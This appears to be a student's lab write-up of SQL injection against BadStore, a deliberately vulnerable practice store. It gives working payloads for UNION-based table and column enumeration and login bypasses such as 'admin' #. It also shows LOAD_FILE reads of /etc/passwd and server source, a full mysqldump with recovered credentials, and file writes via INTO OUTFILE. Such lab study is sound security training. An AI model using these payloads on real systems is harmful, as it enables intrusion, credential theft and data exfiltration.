I used single qoute to test different fields for SQL injection vueneriablity. This caused an error telling me the query had invalid syntax, and that the database was MySQL. 
[error_message]
Since this is a practice website it gives you the query, "SELECT itemnum, sdesc, ldesc, price FROM itemdb WHERE '<user input>' IN (itemnum,sdesc,ldesc)" To get all the items in the store the string "1'='1' #" can be used. This will create a true statement for the where clause, and comment the rest of the statement out. 
[all_items] 
Other injections that could be used to do the same are: <br>
"' OR 1=1 #", closes string then makes true statement <br>
"' OR 1 #", closes string, the 1 is treated as true by MySQL <br>
A good next step is to find the version of the database being ran. To do this we need to inject a UNION statement. A UNION statement will only work if both tables have the same number of columns. To find the right number of columns we can add 1 for each extra column until there is no error. This table has 6 columns, 4 from table, image, and a check box for checkout. 
1'='1' UNION SELECT VERSION() # unions with 1 column table <br> 
1'='1' UNION SELECT VERSION(), 1 # unions with 2 column table <br>
1'='1' UNION SELECT VERSION(), 1, 1 # unions with 3 column table <br>
1'='1' UNION SELECT VERSION(), 1, 1, 1 # unions with 4 columns table <br>
[version] 
This tells us that the MySQL version is 4.1.7-standard. INFORMATION_SCHEMA is a good way to find all the databases, tables and columns that are in the database. Unforanteally, this was added in version 5.02 which is after BadStore's database. Instead this information needs to be guessed through trail and error. 
To start guessing table names we can use "1'='1' UNION SELECT 1, 1, 1 from <table_name> #". To make it easier on ourseleves the WHERE can be made false, so only the injected information shows up. Now if nothing shows up then there is no table name for the name you guessed. The first query told us the item table is called itemdb, so we can guess there might be a userdb for users. 
1'='0' UNION SELECT 1, 1, 1, 1 from userdb # <br> 
[1s_returned]
Now we know that there is a table called userdb. 
While testing on BadStore, if it tells you that the search bar is too short then you can use other methods. Examples are using burpsuite to change the request outside of the form, or use curl. The maxlength can be changed by inspecting the html form input field. 
[form_length]
The BadStore also passes the form input through the URL, so it can be changed there too. If puting the SQL injection into the URL, the string needs to be URL encoded. 
http://192.168.126.135/cgi-bin/badstore.cgi?searchquery=1%27%3D%270%27+UNION+SELECT+1%2C+1%2C+1%2C+1+from+userdb+%23+&action=search&x=0&y=0 <br>
Is the same as <br> 
1'='0' UNION SELECT 1, 1, 1, 1 from userdb # <br>
Some of the special charaters encoded are: <br>
' = %27 <br>
= = %3D <br>
, = %2C <br>
# = %23 <br>
/ = %2F <br> 
+ = space <br>
There is a table called userdb, but we need to find the column names so we can start dumping information. One way to find possible names for the columns is through the tags in the html. If we open the source for the login page and search for "INPUT TYPE", there are tags for "email", "fullname", "passwd", and "pwdhint". These can be used to start testing for column names. 
[html_tags]
Each of the following returns information about a user. <br>
1'='0' UNION SELECT email, 1, 1, 1 from userdb # <br>
1'='0' UNION SELECT fullname, 1, 1, 1 from userdb # <br>
1'='0' UNION SELECT passwd, 1, 1, 1 from userdb # <br>
1'='0' UNION SELECT pwdhint, 1, 1, 1 from userdb # <br>
[user_information]
[The way databases log in here]
Now we have a list of user names, emails and password hashes for BadStore. In the login page we can inject "admin' #", this sets the username as admin and comments out the password check. 
[login_as_admin]
If we didn't have a list of the users then we could try injecting "' OR 1=1 #", which will log you in as the first user in the userdb table. For BadStore this logs you in as the test account. 
[test_account]
Another injection to try is "' OR 1=1 ORDER BY email #", which will log you in as the first email when ordered alhaphecially. 
If you don't know the exact version of admin they are using the injection "' OR email like 'admin' #" can be used. This will return any records where the email contains admin, such as "admin", "administor", "dbadmin", or "admindb". 
If the database doesn't have an account called admin then all the accounts can be interated over until an account is found with the permissions needed. The command LIMIT can be used to return the nth row in a table. The query "' OR 1=1 LIMIT 3, 1 #", will return the 4th row in the table. The row number can be changed each time to change the user login as until you hit an error, which means there are no more users. 
The same techniques can be used to login as a supplier. <br> 
[supplier_login]
Another useful feature that MySQL provides is called load_file, which will load a file from the server into the table. This can be used to load any file that the database has access to. If we wanted to read the /etc/passwd file we could inject "1'='0' UNION SELECT 1, 1, 1, LOAD_FILE('/etc/passwd') #". 
[passwd_file]
This will give us all the user accounts for the underlying system, which are root and nobody here. When we got an error eariler there was a path to the .cgi file, "/usr/local/apache/cgi-bin/badstore.cgi". If we didn't have this error then we could check common places files are stored on webservers, or use the URL as a guide. Lets see what is in it. 
1'='0' UNION SELECT 1, 1, 1, LOAD_FILE('/usr/local/apache/cgi-bin/badstore.cgi') # <br> 
[cgi_file]
This is the file the webserver uses to create the BadStore webpage. There are some interesting things we can find in this page. 
[MySQL_username_passwd]
The username and password to the MySQL database is root and secert. 
[secert_admin_portal]
There is a secert admin portal referenced in the code. 
[cookie_format] 
The layout of the cookie can be found here, along with the fact it checks the cookie to see if user is admin. This information could be used to manipulate the cookie to get access to things you are supposed to be. 
Errors logs: <br>
h2("Recent Apache Error Log"),p,hr, `tail /usr/local/apache/logs/error_log` <br>
Location of backup database: <br>
prepare( "SELECT * FROM orderdb INTO OUTFILE '/usr/local/apache/htdocs/backup/orderdb.bak'") <br>
Other table names: <br>
INSERT INTO orderdb (sessid, orderdate, ordertime, ordercost, orderitems, itemlist, accountid, ipaddr, cartpaid, ccard, expdate) <br>
[cart_cookie]
There's probably even more information you can get from the .cgi file. We know the MySQL database username and password now so we can connect directly to it instead of going through the website. 
[mysql_console]
The database can also be dumped using mysqldump -h 192.168.126.135 -u root -p badstoredb > local_file
[database_dump]
If using a MySQL client version that is after 5.02 you may get the error "mysqldump: Error: 'Table 'INFORMATION_SCHEMA.FILES' doesn't exist' when trying to dump tablespaces". This is fine, its just looking for INFORMATION_SCHEMA, but it still dumps the database. 
The database dump will give us all the tables and columns in the database, along with any information stored in them. 
There are also Metaexploit modules that can be useful when trying to get into a database server. 
[Metaexploit]
BadStore allows the user to upload files to the server from the supplier page. If this wasn't available, then the MySQL function outfile could be used. This function can be used to write a field from a column into a file on the webserver. 
From the MySQL console we can issue the following commands: <br>
CREATE TABLE badstoredb.`exploit` ( `code` varchar(256)); <br> 
INSERT INTO badstoredb.exploit VALUES ('test exploit'); <br>
SELECT code into outfile '/usr/local/apache/cgi-bin/test.html' from badstoredb.exploit; <br> 
[uploading_file]



 













